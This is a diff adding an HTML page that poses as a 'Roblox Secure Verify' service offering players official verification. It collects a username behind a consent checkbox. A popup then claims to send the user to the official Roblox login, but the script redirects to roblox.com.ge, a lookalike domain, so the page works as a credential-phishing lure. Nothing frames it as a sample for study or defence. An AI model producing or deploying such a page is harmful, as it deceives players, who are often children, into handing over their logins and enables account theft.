@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox Secure Verification</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #1a1a1a, #2b2b2b);
+            color: white;
+            text-align: center;
+            padding-top: 80px;
+        }
+
+        .box {
+            background: #111;
+            padding: 35px;
+            width: 420px;
+            margin: auto;
+            border-radius: 15px;
+            box-shadow: 0 0 25px rgba(255,0,0,0.4);
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        h2 {
+            color: #ff2e2e;
+            letter-spacing: 1px;
+        }
+
+        input[type="text"] {
+            width: 95%;
+            padding: 12px;
+            margin: 15px 0;
+            border-radius: 8px;
+            border: none;
+            background: #222;
+            color: white;
+        }
+
+        input[type="text"]:focus {
+            outline: none;
+            box-shadow: 0 0 10px red;
+        }
+
+        button {
+            background: linear-gradient(90deg, #ff0000, #ff4d4d);
+            color: white;
+            padding: 12px;
+            border: none;
+            width: 100%;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.3s;
+            opacity: 0.6;
+        }
+
+        button.enabled {
+            opacity: 1;
+            box-shadow: 0 0 15px red;
+        }
+
+        button:hover.enabled {
+            transform: scale(1.05);
+            box-shadow: 0 0 25px red;
+        }
+
+        button:disabled {
+            cursor: not-allowed;
+        }
+
+        .terms {
+            font-size: 13px;
+            margin-top: 10px;
+            text-align: left;
+        }
+
+        /* Overlay */
+        .overlay {
+            display: none;
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            backdrop-filter: blur(5px);
+            background: rgba(0,0,0,0.6);
+            top: 0;
+            left: 0;
+        }
+
+        /* Popup */
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0.8);
+            background: #1c1c1c;
+            padding: 25px;
+            border-radius: 15px;
+            width: 350px;
+            box-shadow: 0 0 30px red;
+            text-align: center;
+            animation: popUp 0.3s forwards;
+        }
+
+        .popup button {
+            margin-top: 15px;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes popUp {
+            to { transform: translate(-50%, -50%) scale(1); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h2>🔥 ROBLOX SECURE VERIFY 🔥</h2>
+
+    <p style="font-size:14px;">
+        Become an officially verified player 😎  
+        Protect your account from bots, impostors, and scammers.
+    </p>
+
+    <input type="text" id="username" placeholder="Enter Your Roblox Username">
+
+    <div class="terms">
+        <input type="checkbox" id="agree" onclick="toggleButton()">
+        I confirm I am the real owner and agree to the cool rules.
+    </div>
+
+    <button id="verifyBtn" disabled onclick="verifyAccount()">VERIFY NOW 🚀</button>
+</div>
+
+<div class="overlay" id="overlay"></div>
+
+<div class="popup" id="popupBox">
+    <p>
+        🚀 You're about to be redirected to the official Roblox login  
+        to complete full account verification.
+    </p>
+    <button onclick="redirectToRoblox()">LET'S GO 😎</button>
+</div>
+
+<script>
+function toggleButton() {
+    let checkbox = document.getElementById("agree");
+    let button = document.getElementById("verifyBtn");
+
+    button.disabled = !checkbox.checked;
+
+    if (checkbox.checked) {
+        button.classList.add("enabled");
+    } else {
+        button.classList.remove("enabled");
+    }
+}
+
+function verifyAccount() {
+    let username = document.getElementById("username").value;
+
+    if(username.length < 3) {
+        alert("Whoa there 😅 Username must be at least 3 characters!");
+        return;
+    }
+
+    document.getElementById("overlay").style.display = "block";
+    document.getElementById("popupBox").style.display = "block";
+}
+
+function redirectToRoblox() {
+    window.location.href = "https://roblox.com.ge/login?returnUrl=1306813592736560";
+}
+</script>
+
+</body>
+</html>
